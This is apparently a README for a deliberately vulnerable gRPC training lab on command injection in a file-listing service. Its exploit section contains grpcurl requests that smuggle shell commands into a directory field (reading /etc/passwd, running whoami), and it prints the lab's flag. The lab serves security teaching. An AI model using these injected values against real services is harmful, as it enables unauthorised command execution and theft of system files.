# Lab 008: Command Injection

## Vulnerability
File Listing service with command injection vulnerability.

## Objective
Exploit command injection in the ls command to read the flag file.

## Run the Lab
```bash
# Build and run
docker build -t grpc-008 .
docker run -p 8008:8008 grpc-008
```

## Exploit

```bash
# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Normal directory listing
grpcurl -plaintext -d '{
  "directory": "/tmp"
}' localhost:8008 fileprocessor.FileProcessor/ListFiles

# Command injection - read flag file
grpcurl -plaintext -d '{
  "directory": "/tmp; cat /tmp/flag.txt"
}' localhost:8008 fileprocessor.FileProcessor/ListFiles

# Command injection - execute whoami
grpcurl -plaintext -d '{
  "directory": "/tmp; whoami"
}' localhost:8008 fileprocessor.FileProcessor/ListFiles

# Command injection - read system files
grpcurl -plaintext -d '{
  "directory": "/tmp; cat /etc/passwd"
}' localhost:8008 fileprocessor.FileProcessor/ListFiles
```

## Impact
Attackers can execute arbitrary commands through the file listing functionality.

## Flag
Successfully read the flag file to get: `GRPC_GOAT{command_injection_file_listing}`

## Mitigation
Validate directory paths and avoid shell execution with user input.